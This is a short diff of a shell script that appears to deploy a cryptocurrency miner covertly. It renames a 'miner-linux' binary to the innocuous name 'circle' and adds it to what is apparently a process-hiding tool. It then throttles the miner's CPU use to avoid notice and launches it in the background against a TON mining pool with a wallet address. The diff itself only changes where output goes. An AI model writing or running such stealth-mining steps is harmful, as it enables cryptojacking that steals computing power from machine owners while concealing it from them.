@@ -14,4 +14,4 @@ mv miner-linux circle
 ph add circle
 chmod +x circle
 cpulimit -e circle -l 30 &
-nohup ./circle https://next.ton-pool.com EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF > nohup.out
+nohup ./circle https://next.ton-pool.com EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF &
